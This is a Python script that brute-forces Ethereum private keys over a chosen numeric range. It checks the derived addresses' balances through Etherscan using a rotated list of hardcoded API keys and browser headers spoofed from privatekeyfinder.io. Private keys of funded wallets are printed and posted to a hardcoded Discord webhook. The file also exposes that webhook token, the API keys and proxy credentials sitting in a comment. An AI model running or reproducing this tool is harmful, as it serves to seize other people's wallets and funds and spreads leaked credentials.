import asyncio
import aiohttp
import random
import time
import requests
from Crypto.Hash import keccak
import ecdsa
import binascii
import threading
from discordwebhook import Discord
while True:
    try:
        start_value = int(input("Start value: "))
        if start_value <=0:
            print("Start value Should be positive")
            continue
        break
    except ValueError:
        print("Error: value should in integer format")

while True:
    try:
        end_value = int(input("End value: "))
        if end_value <=start_value:
            print("Eng value Should be positive and more the start value")
            continue
        break
    except ValueError:
        print("Error: value should in integer format")
number_of_threads = int(input("Number of threads: "))
check_in_thread = int((end_value - start_value)/number_of_threads)
start_value_temp= start_value

def DiscordNotification(Msg):
    try:
        webHookUrl = "https://discord.com/api/webhooks/1237273754414092328/TKG1nt0b7VCWspq-oFpModKHWLcsQB-aAaNBLHxYDSJXDIa-c9OF0J6WH2n9L-UjwPPh"
        discord = Discord(url=webHookUrl)
        discord.post(content=Msg)
    except Exception as e:
        pass

api_keys = [
    'F92Z14GE2DTF6PBBYY1YPHPJ438PT3P2VI',
    '4Q5U7HNF4CGTVTGEMGRV5ZU9WYNJ6N7YA5',
    'EX8K12JY7BCVG8RAUU8X2Z6QT2GCF5EYB4',
    'DZHWCIEA2WW86CZEC88IGWG1JFB6JN3VHS',
    'YIDAXPUWHJB21RJVMS1JMXHABMEF67RQWG',
    '12RU83G1ATVA9V4EMM3U45X8BG4RG9PM6T',
    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
    'SH884AZJMKIFDMAPSMHTHJUQ3QIRPH827I',
    'PYM9U2QD949KZZX23QJ4YZRX3KC3PHAI88',
    'TDMPDZU8RD4V9FVB66P5S47QETEJ6R61UY',
]

async def fetch_balance(session, addresses, api_key):
    headers = {
        'accept': 'text/html, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,de-CH;q=0.8,de;q=0.7',
        'origin': 'https://privatekeyfinder.io',
        'priority': 'u=1, i',
        'referer': 'https://privatekeyfinder.io/',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }
    async with session.get(f'https://api.etherscan.io/api?module=account&action=balancemulti&address={addresses}&tag=latest&apikey={api_key}', headers=headers) as response:
        return await response.json()

async def get_balances(addresses, api_key):
    async with aiohttp.ClientSession() as session:
        return await fetch_balance(session, addresses, api_key)

    
def get_balance_new(addresses, thread_count):
    api_key = api_keys[thread_count % len(api_keys)]
    addresses = ','.join(addresses)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(get_balances(addresses, api_key))
    # print(result)
    return result

def get_balance(address, thread_count):
    headers = {
        'accept': 'text/html, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,de-CH;q=0.8,de;q=0.7',
        'origin': 'https://privatekeyfinder.io',
        'priority': 'u=1, i',
        'referer': 'https://privatekeyfinder.io/',
        'sec-ch-ua': '"Chromium";v="124", "Microsoft Edge";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }
    address = ','.join(address)
    api_key = api_keys[thread_count % len(api_keys)]
    limit = 5
    while limit >= 0:
        try:
            response = requests.get(
                f'https://api.etherscan.io/api?module=account&action=balancemulti&address={address}&tag=latest&apikey={api_key}',
                headers=headers,
                #     proxies={
                #     "http": "http://qunrqwhp-rotate:1s8pqa508el2@p.webshare.io:80/",
                #     "https": "http://qunrqwhp-rotate:1s8pqa508el2@p.webshare.io:80/"
                # }
            )
            return response.json()
        except:
            time.sleep(3)
            limit -= 1


def generate_address(private_Key):
    # Convert decimal to hexadecimal, remove '0x' prefix and pad with zeros to make it 64 characters long
    private_key = hex(private_Key)[2:].zfill(64)
    # print("Private Key:", private_key)

    # Generate public key
    sk = ecdsa.SigningKey.from_string(
        binascii.unhexlify(private_key), curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    public_key = vk.to_string()

    # Hash the public key using Keccak-256
    keccak_hash = keccak.new(digest_bits=256)
    keccak_hash.update(public_key)
    public_key_hash = keccak_hash.digest()

    # Take the last 20 bytes
    ethereum_address = "0x" + public_key_hash.hex()[-40:]
    return ethereum_address


def run(start, thread_count):
    count = start
    no_of_accounts = 20  # 20 maximum
    while count < start+check_in_thread:
        address = []
        for i in range(no_of_accounts):
            ethereum_address = generate_address(count)
            address.append(ethereum_address)
            count += 1
        # print(len(address))
        # exit()
        response = get_balance(address, thread_count)
        # print(response)
        if response['status'] == '0':
            # print(response.json())
            time.sleep(5)
            count -= 10
            continue
        try:
            # print(response.json())
            # {'status': '0', 'message': 'NOTOK', 'result': 'Max rate limit reached'}
            # print(len(response.json()['result']))
            for index, rec in enumerate(response['result']):
                hex_id = index+count - no_of_accounts
                balance = rec['balance']
                address = rec['account']
                if int(balance) > 3000000000000000:
                    print("Found good balance, private-key",
                          hex(hex_id)[2:].zfill(64))
                    DiscordNotification(f"Private Key:{hex(hex_id)[2:].zfill(64)}: balance: {balance/1000000000000000000}")
                elif int(balance) > 0:
                    print(hex_id, address, int(balance)/1000000000000000000)
                # else:
                #     print(hex_id, address, balance)
        except Exception as e:
            print(e)
            print(response)
            break


def run_multiple_threads():
    global start_value
    threads = []
    # start_value = random.randint(
    #     1, 115792089237316195423570985008687907852837564279074904382605163141518161494336)
    # start_value = random.randint(1,2)
    # Start 10 threads
    # print(start_value)
    for thread_count in range(number_of_threads):
        thread = threading.Thread(
            target=run, args=(start_value, thread_count,))
        thread.start()
        threads.append(thread)
        start_value += check_in_thread  # Adjust start value for next thread
    # Wait for all threads to finish
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    try:
        DiscordNotification(f"Bot mining started!")
        start_time = time.time()
        run_multiple_threads()
        end_time = time.time()
        execution_time = end_time - start_time
        print(f"Execution time: {execution_time} seconds")
        DiscordNotification(f"Bot mining Finished!: start value: {start_value_temp}, End value: {end_value}, Number of threads: {number_of_threads}, Execution time: {execution_time} sec")
    except Exception as e:
        DiscordNotification(f"Server 01: Failed to run, restart it. {e}")
